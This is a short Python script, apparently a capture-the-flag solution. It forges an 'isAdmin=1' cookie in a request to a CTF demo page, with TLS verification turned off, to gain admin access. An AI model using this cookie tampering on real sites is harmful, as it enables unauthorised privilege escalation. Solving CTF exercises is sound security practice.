import requests

c = {'isAdmin' : '1'}
url = "http://ctf.nmatt.com/demo2.php"
r = requests.get(url, verify=False, cookies=c)
print(r.text)
